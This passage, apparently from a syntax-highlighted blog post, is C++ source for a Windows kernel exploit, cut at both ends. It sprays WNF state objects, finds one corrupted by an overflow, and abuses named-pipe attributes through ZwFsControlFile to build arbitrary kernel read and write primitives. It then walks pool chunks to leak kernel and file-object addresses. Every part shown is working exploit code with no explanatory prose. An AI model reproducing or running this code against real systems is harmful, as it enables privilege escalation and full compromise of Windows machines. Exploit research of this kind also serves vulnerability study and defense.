class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwQueryEaFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pEaListBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">createWnfStateData</span><span class="params">(PWNF_STATE_NAME pState)</span> </span>&#123;</span><br><span class="line">    PZwCreateWnfStateName ZwCreateWnfStateName = (PZwCreateWnfStateName)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwCreateWnfStateName&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwCreateWnfStateName) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwCreateWnfStateName : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SECURITY_DESCRIPTOR sd;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sd, <span class="number">0</span>, <span class="built_in">sizeof</span>(sd));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">InitializeSecurityDescriptor</span>(&amp;sd, SECURITY_DESCRIPTOR_REVISION)) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to InitializeSecurityDescriptor : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwCreateWnfStateName</span>(pState, WnfTemporaryStateName, WnfDataScopeUser, FALSE, <span class="number">0</span>, <span class="number">0x1000</span>, &amp;sd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwCreateWnfStateName: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">updateWnfStateData</span><span class="params">(PWNF_STATE_NAME pState, PVOID pBuffer, ULONG size)</span> </span>&#123;</span><br><span class="line">    PZwUpdateWnfStateData ZwUpdateWnfStateData = (PZwUpdateWnfStateData)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwUpdateWnfStateData&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwUpdateWnfStateData) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwUpdateWnfStateData : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwUpdateWnfStateData</span>(pState, pBuffer, size, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwUpdateWnfStateData: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">PWNF_STATE_NAME <span class="title">sprayWNF</span><span class="params">(ULONG size,ULONG chr = <span class="number">0x61</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] sprayWNF &quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] spraySize : 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; size &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] allocSize : 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; ALLOC_SIZE &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line"></span><br><span class="line">    PCHAR pBuffer = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, ALLOC_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pBuffer&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pBuffer, chr, ALLOC_SIZE);</span><br><span class="line"></span><br><span class="line">    LPVOID pStates = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">8</span> * size, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pStates == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pStates&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        WNF_STATE_NAME state;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;state, <span class="number">0</span>, <span class="built_in">sizeof</span>(state));</span><br><span class="line">        <span class="built_in">createWnfStateData</span>(&amp;state);</span><br><span class="line">        ((PWNF_STATE_NAME)pStates)[i] = state;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        <span class="built_in">updateWnfStateData</span>(&amp;((PWNF_STATE_NAME)pStates)[i], pBuffer, ALLOC_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pBuffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (PWNF_STATE_NAME)pStates;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">deleteWnfStateData</span><span class="params">(PWNF_STATE_NAME state)</span> </span>&#123;</span><br><span class="line">    PZwDeleteWnfStateData ZwDeleteWnfStateData = (PZwDeleteWnfStateData)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwDeleteWnfStateData&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwDeleteWnfStateData) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwDeleteWnfStateData : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwDeleteWnfStateData</span>(state, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwDeleteWnfStateData: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">queryWnfStateData</span><span class="params">(PWNF_STATE_NAME pState, PWNF_CHANGE_STAMP wmfChangeStamp, PVOID queryBuffer, PULONG queryBufferSize,BOOLEAN isCheckStatus = FALSE)</span> </span>&#123;</span><br><span class="line">    PZwQueryWnfStateData ZwQueryWnfStateData = (PZwQueryWnfStateData)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwQueryWnfStateData&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwQueryWnfStateData) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwQueryWnfStateData : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwQueryWnfStateData</span>(pState, <span class="number">0</span>, <span class="number">0</span>, wmfChangeStamp, queryBuffer, queryBufferSize);</span><br><span class="line">    <span class="keyword">if</span> (isCheckStatus) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">            std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwQueryWnfStateData: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printLookForOverflowWNFResult</span><span class="params">(ULONG idx, WNF_CHANGE_STAMP wmfChangeStamp,PCHAR queryBuffer,ULONG queryBufferSize)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] get idx : &quot;</span> &lt;&lt; std::hex &lt;&lt; idx &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] get wmfChangeStamp : &quot;</span> &lt;&lt; std::hex &lt;&lt; wmfChangeStamp &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;\t[+] length: &quot;</span> &lt;&lt; std::hex &lt;&lt; queryBufferSize &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PRINTBUFFER</span></span><br><span class="line">    <span class="built_in">printBuffer</span>(queryBuffer, queryBufferSize);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// PRINTBUFFER</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG <span class="title">lookForOverflowWNF</span><span class="params">(PWNF_STATE_NAME states)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] lookForOverflowWNF &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG        </span></span></span><br><span class="line"></span><br><span class="line">    ULONG idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SPRAY_SIZE; i++) &#123;</span><br><span class="line"></span><br><span class="line">        WNF_CHANGE_STAMP wmfChangeStamp = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> queryBuffer[FAKE_WNF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        ULONG queryBufferSize = <span class="built_in">sizeof</span>(queryBuffer);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">queryWnfStateData</span>(&amp;states[i], &amp;wmfChangeStamp, queryBuffer, &amp;queryBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (wmfChangeStamp == <span class="number">2</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">            <span class="built_in">printLookForOverflowWNFResult</span>(i, wmfChangeStamp, queryBuffer, queryBufferSize);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line">            idx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to lookForOverflowWNF&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] getOverflowWNFIdx &quot;</span> &lt;&lt; std::hex &lt;&lt; idx &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG  </span></span></span><br><span class="line">    <span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">PipeHandles <span class="title">createPipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] createPipe &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG    </span></span></span><br><span class="line"></span><br><span class="line">    HANDLE readPipe, writePipe;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CreatePipe</span>(&amp;readPipe, &amp;writePipe, <span class="literal">NULL</span>, <span class="number">0x1000</span>)) &#123;</span><br><span class="line">        DWORD error = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to CreatePipe: &quot;</span> &lt;&lt; std::hex &lt;&lt; error;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PipeHandles ph = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ph.readPipe = readPipe;</span><br><span class="line">    ph.writePipe = writePipe;</span><br><span class="line">    <span class="keyword">return</span> ph;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipeWriteAttribute</span><span class="params">(PipeHandles pipeHandles,PCHAR nameBuffer,PCHAR valueBuffer)</span> </span>&#123;</span><br><span class="line">    PZwFsControlFile ZwFsControlFile = (PZwFsControlFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwFsControlFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwFsControlFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwFsControlFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK fsControlFileIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    ULONG nameLen = <span class="built_in">strlen</span>(nameBuffer);</span><br><span class="line">    ULONG valueLen = PIPE_ATTRIBUTE_BUFFER_SIZE - nameLen - <span class="number">1</span>;</span><br><span class="line">    ULONG totalLen = nameLen + valueLen;</span><br><span class="line"></span><br><span class="line">    PCHAR pAttribute = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, PIPE_ATTRIBUTE_BUFFER_SIZE, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pAttribute == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pAttribute&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pAttribute, <span class="number">0</span>, PIPE_ATTRIBUTE_BUFFER_SIZE);</span><br><span class="line">    <span class="built_in">memcpy</span>(pAttribute, nameBuffer, nameLen);</span><br><span class="line">    <span class="built_in">memcpy</span>(pAttribute + nameLen + <span class="number">1</span>, valueBuffer, valueLen);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> output[FAKE_WNF_SIZE];</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwFsControlFile</span>(pipeHandles.writePipe,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;fsControlFileIoStatusBlock,</span><br><span class="line">        <span class="number">0x11003C</span>,</span><br><span class="line">        pAttribute,</span><br><span class="line">        PIPE_ATTRIBUTE_BUFFER_SIZE,</span><br><span class="line">        output,</span><br><span class="line">        <span class="built_in">sizeof</span>(output)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwFsControlFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">VirtualFree</span>(pAttribute, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipeDeleteAttribute</span><span class="params">(PipeHandles pipeHandles, PCHAR nameBuffer)</span> </span>&#123;</span><br><span class="line">    PZwFsControlFile ZwFsControlFile = (PZwFsControlFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwFsControlFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwFsControlFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwFsControlFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK fsControlFileIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    ULONG nameLen = <span class="built_in">strlen</span>(nameBuffer) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> output[FAKE_WNF_SIZE];</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwFsControlFile</span>(pipeHandles.writePipe,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;fsControlFileIoStatusBlock,</span><br><span class="line">        <span class="number">0x11003C</span>,</span><br><span class="line">        nameBuffer,</span><br><span class="line">        nameLen,</span><br><span class="line">        output,</span><br><span class="line">        <span class="built_in">sizeof</span>(output)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwFsControlFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipeReadAttribute</span><span class="params">(PipeHandles pipeHandles, PCHAR nameBuffer, PCHAR output, ULONG size)</span> </span>&#123;</span><br><span class="line">    PZwFsControlFile ZwFsControlFile = (PZwFsControlFile)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;ZwFsControlFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ZwFsControlFile) &#123;</span><br><span class="line">        DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to get ZwFsControlFile : &quot;</span> &lt;&lt; err;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IO_STATUS_BLOCK fsControlFileIoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    ULONG nameLen = <span class="built_in">strlen</span>(nameBuffer) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">ZwFsControlFile</span>(pipeHandles.writePipe,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;fsControlFileIoStatusBlock,</span><br><span class="line">        <span class="number">0x110038</span>,   </span><br><span class="line">        nameBuffer,</span><br><span class="line">        nameLen,</span><br><span class="line">        output,</span><br><span class="line">        size</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to ZwFsControlFile: &quot;</span> &lt;&lt; std::hex &lt;&lt; status;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">arbRead</span><span class="params">(UINT64 addr, PWNF_STATE_NAME state, PVOID pQueryBuffer, PipeHandles pipeHandles, PCHAR output, ULONG size)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> name[PIPE_NAME_LEN] = &#123;</span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">        <span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,</span><br><span class="line">        ((PCHAR)pQueryBuffer)[ALLOC_SIZE + <span class="number">0x40</span>]</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    ((PUINT64) pQueryBuffer)[(ALLOC_SIZE + <span class="number">0x30</span>) / <span class="number">0x8</span>] = addr;</span><br><span class="line">    <span class="built_in">updateWnfStateData</span>(state, pQueryBuffer, FAKE_WNF_SIZE);</span><br><span class="line">    <span class="built_in">pipeReadAttribute</span>(pipeHandles, name, output, size);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PRINTBUFFER</span></span><br><span class="line">    <span class="built_in">printBuffer</span>(output, size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">arbWrite</span><span class="params">(UINT64 addr, PVOID pBuffer, ULONG bufferSize, PWNF_STATE_NAME pOverflowWNFState, PVOID pQueryBuffer, PWNF_STATE_NAME pWriteStateName)</span> </span>&#123;</span><br><span class="line">    ((PUINT64)pQueryBuffer)[(ALLOC_SIZE + TOTAL_WNF_SIZE + <span class="number">0x68</span>) / <span class="number">0x8</span>] = addr - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">updateWnfStateData</span>(pOverflowWNFState, pQueryBuffer, FAKE_WNF_SIZE);</span><br><span class="line">    <span class="built_in">updateWnfStateData</span>(pWriteStateName, pBuffer, bufferSize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">arbWrite64</span><span class="params">(UINT64 addr, UINT64 value, PWNF_STATE_NAME pOverflowWNFState, PVOID pQueryBuffer, PWNF_STATE_NAME pWriteStateName)</span> </span>&#123;</span><br><span class="line">    ((PUINT64) pQueryBuffer)[(ALLOC_SIZE + TOTAL_WNF_SIZE + <span class="number">0x68</span>) / <span class="number">0x8</span>] = addr - <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">updateWnfStateData</span>(pOverflowWNFState, pQueryBuffer, FAKE_WNF_SIZE);</span><br><span class="line"></span><br><span class="line">    PCHAR pValue = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(value), MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (pValue == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;[-] failed to VirtualAlloc pValue&quot;</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(pValue, <span class="number">0</span>, <span class="built_in">sizeof</span>(value));</span><br><span class="line">    <span class="built_in">memcpy</span>(pValue, &amp;value, <span class="built_in">sizeof</span>(value));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">arbWrite</span>(addr, pValue, <span class="built_in">sizeof</span>(value), pOverflowWNFState, pQueryBuffer, pWriteStateName);</span><br><span class="line">    <span class="built_in">VirtualFree</span>(pValue, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">UINT64 <span class="title">arbRead64</span><span class="params">(UINT64 addr, PWNF_STATE_NAME state, PVOID pQueryBuffer, PipeHandles pipeHandles)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> output[FAKE_WNF_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">arbRead</span>(addr, state, pQueryBuffer, pipeHandles, output, <span class="built_in">sizeof</span>(output));</span><br><span class="line">    UINT64 result = ((PUINT64)output)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">checkIsKernelAddr</span><span class="params">(UINT64 addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((addr &gt;&gt; <span class="number">48</span>) == <span class="number">0xffff</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">UINT64 <span class="title">leakKernelAddr</span><span class="params">(UINT64 fd, PWNF_STATE_NAME state, PVOID pQueryBuffer, PipeHandles pipeHandles)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] leakKernelAddr &quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG    </span></span></span><br><span class="line"></span><br><span class="line">    UINT64 currentfd = fd;</span><br><span class="line">    UINT64 nextfd = <span class="number">0</span>;</span><br><span class="line">    UINT64 tag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_WRITE_ROUNDS; i++) &#123;</span><br><span class="line">        tag = <span class="built_in">arbRead64</span>(currentfd - <span class="number">0x10</span>, state, pQueryBuffer, pipeHandles) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">        nextfd = <span class="built_in">arbRead64</span>(currentfd, state, pQueryBuffer, pipeHandles);</span><br><span class="line">        <span class="keyword">if</span> (tag != <span class="number">0x7441704e</span>) &#123;</span><br><span class="line">            std::cout &lt;&lt; <span class="string">&quot;[+] find the special chunk : &quot;</span> &lt;&lt; std::hex &lt;&lt; currentfd &lt;&lt; std::endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        currentfd = nextfd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UINT64 pFileObject = <span class="built_in">arbRead64</span>(currentfd - FILE_OBJECT_OFFSET, state, pQueryBuffer, pipeHandles);</span><br><span class="line">    